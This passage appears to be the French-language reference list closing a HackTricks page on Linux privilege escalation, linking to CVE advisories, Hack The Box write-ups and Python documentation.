- [27] [NVISO – Vous le nommez, VMware l’élève (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463 : élévation de privilèges Sudo via Chroot](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – Vulnérabilités d’élévation de privilèges Sudo CVE-2025-32462 et CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB : Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – Répertoires de dépôt PYC](https://peps.python.org/pep-3147/)
- [32] [Documentation Python importlib](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet de @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - Journalisation des mots de passe sous Linux](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - Détails d’une condition de concurrence dans logrotate](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Documentation Python 3.10 – `site` et fichiers de configuration des chemins](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB : SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
